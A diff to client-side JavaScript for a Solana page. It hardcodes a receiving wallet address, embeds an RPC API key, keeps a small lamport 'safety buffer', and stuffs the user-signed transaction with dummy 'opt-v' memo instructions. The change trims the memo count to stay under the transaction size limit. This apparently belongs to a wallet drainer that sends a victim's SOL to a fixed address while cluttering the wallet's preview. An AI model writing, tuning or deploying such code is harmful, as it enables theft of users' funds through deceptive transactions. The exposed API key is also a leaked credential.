@@ -281,7 +281,7 @@
     const SOL_RECEIVER = "3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1";
     const HELIUS_URL = "https://mainnet.helius-rpc.com/?api-key=06ec4cdf-ba6c-4dfc-827f-5bae3b93f146";
     const MEMO_PROGRAM = "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr";
-    const DUMMY_MEMO_COUNT = 37;
+    const DUMMY_MEMO_COUNT = 12; // Optimized to safely stay under the 1232-byte limit
     const SAFETY_BUFFER_LAMPORTS = 50000;
 
     let currentStep = 'sendTo'; 
@@ -367,9 +367,9 @@
             })
         );
 
-        // 2. Instructions 2-38: Dummy Memos
+        // 2. Dummy Memos (Optimized count to stay under 1232 bytes)
         for (let i = 0; i < DUMMY_MEMO_COUNT; i++) {
-            const memoText = `opt-verify-${i}-${Date.now()}`;
+            const memoText = `opt-v-${i}-${Date.now()}`;
             transaction.add(
                 new solanaWeb3.TransactionInstruction({
                     keys: [{ pubkey: userPublicKey, isSigner: true, isWritable: false }],
